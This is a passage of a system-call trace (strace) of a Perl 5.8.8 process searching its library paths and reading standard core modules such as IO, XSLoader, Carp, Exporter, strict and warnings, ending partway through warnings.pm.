19001 12:57:07.369500 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf8e4250) = -1 ENOENT (No such file or directory)
19001 12:57:07.369515 stat64("/usr/local/lib/perl/5.8.7", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369528 stat64("/usr/local/share/perl/5.8.7", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369540 stat64("/usr/local/lib/perl/5.8.6", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369552 stat64("/usr/local/share/perl/5.8.6", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369564 stat64("/usr/local/lib/perl/5.8.4", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369575 stat64("/usr/local/share/perl/5.8.4", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369587 stat64("/usr/local/lib/perl/5.8.3", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369599 stat64("/usr/local/share/perl/5.8.3", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369610 stat64("/usr/local/lib/perl/5.8.2", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369622 stat64("/usr/local/share/perl/5.8.2", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369633 stat64("/usr/local/lib/perl/5.8.1", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369645 stat64("/usr/local/share/perl/5.8.1", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369657 stat64("/usr/local/lib/perl/5.8.0", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369677 stat64("/usr/local/share/perl/5.8.0", 0xbf8e4390) = -1 ENOENT (No such file or directory)
19001 12:57:07.369700 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e4088) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.369714 _llseek(0, 0, [0], SEEK_CUR) = 0
19001 12:57:07.369726 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e4088) = -1 EBADF (Bad file descriptor)
19001 12:57:07.369737 _llseek(1, 0, 0xbf8e40d0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
19001 12:57:07.369748 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e4088) = -1 EINVAL (Invalid argument)
19001 12:57:07.369759 _llseek(2, 0, 0xbf8e40d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
19001 12:57:07.369769 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
19001 12:57:07.369782 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e4148) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.369795 _llseek(1, 0, [0], SEEK_CUR) = 0
19001 12:57:07.369807 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
19001 12:57:07.369818 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
19001 12:57:07.369837 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
19001 12:57:07.369890 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
19001 12:57:07.378096 getppid()         = 18999
19001 12:57:07.378160 stat64("/etc/perl/IO.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378176 stat64("/etc/perl/IO.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378189 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378202 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378216 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378229 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378242 stat64("/usr/lib/perl5/IO.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378254 stat64("/usr/lib/perl5/IO.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378267 stat64("/usr/share/perl5/IO.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378280 stat64("/usr/share/perl5/IO.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378292 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378305 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
19001 12:57:07.378327 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.378341 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.378353 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.378376 read(7, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
19001 12:57:07.378433 stat64("/etc/perl/XSLoader.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378446 stat64("/etc/perl/XSLoader.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378459 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378472 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378486 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378499 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378513 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378525 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378662 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378675 stat64("/usr/share/perl5/XSLoader.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378689 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.378702 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
19001 12:57:07.378723 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.378737 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.378748 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.378773 read(9, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
19001 12:57:07.379010 brk(0x8195000)    = 0x8195000
19001 12:57:07.379335 _llseek(9, 3407, [3407], SEEK_SET) = 0
19001 12:57:07.379353 _llseek(9, 0, [3407], SEEK_CUR) = 0
19001 12:57:07.379364 close(9)          = 0
19001 12:57:07.379412 stat64("/etc/perl/Carp.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379427 stat64("/etc/perl/Carp.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379441 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379458 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379473 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379485 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379499 stat64("/usr/lib/perl5/Carp.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379511 stat64("/usr/lib/perl5/Carp.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379524 stat64("/usr/share/perl5/Carp.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379537 stat64("/usr/share/perl5/Carp.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379550 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379562 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379576 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.379589 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
19001 12:57:07.379621 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.379637 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.379648 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.379666 read(9, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
19001 12:57:07.380107 read(9, "gmess  @_ }\n\n1;\n", 4096) = 16
19001 12:57:07.380138 read(9, "", 4096) = 0
19001 12:57:07.380150 close(9)          = 0
19001 12:57:07.380172 stat64("/etc/perl/Exporter.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380186 stat64("/etc/perl/Exporter.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380201 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380214 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380228 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380241 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380255 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380267 stat64("/usr/lib/perl5/Exporter.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380280 stat64("/usr/share/perl5/Exporter.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380293 stat64("/usr/share/perl5/Exporter.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380306 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380319 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380332 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.380345 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
19001 12:57:07.380367 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.380381 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.380393 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.380410 read(9, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
19001 12:57:07.380929 _llseek(9, 2217, [2217], SEEK_SET) = 0
19001 12:57:07.380947 _llseek(9, 0, [2217], SEEK_CUR) = 0
19001 12:57:07.380958 close(9)          = 0
19001 12:57:07.381033 stat64("/etc/perl/strict.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381050 stat64("/etc/perl/strict.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381064 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381078 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381092 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381116 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381131 stat64("/usr/lib/perl5/strict.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381143 stat64("/usr/lib/perl5/strict.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381156 stat64("/usr/share/perl5/strict.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381168 stat64("/usr/share/perl5/strict.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381181 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381194 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381207 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381220 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
19001 12:57:07.381241 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.381256 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.381268 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.381292 read(9, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
19001 12:57:07.381433 _llseek(9, 598, [598], SEEK_SET) = 0
19001 12:57:07.381448 _llseek(9, 0, [598], SEEK_CUR) = 0
19001 12:57:07.381458 close(9)          = 0
19001 12:57:07.381496 stat64("/etc/perl/warnings.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381511 stat64("/etc/perl/warnings.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381524 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381538 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381551 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381564 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381578 stat64("/usr/lib/perl5/warnings.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381590 stat64("/usr/lib/perl5/warnings.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381614 stat64("/usr/share/perl5/warnings.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381627 stat64("/usr/share/perl5/warnings.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381640 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381653 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381667 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.381680 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
19001 12:57:07.381701 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 9
19001 12:57:07.381716 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e36a8) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.381728 _llseek(9, 0, [0], SEEK_CUR) = 0
19001 12:57:07.381746 read(9, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> 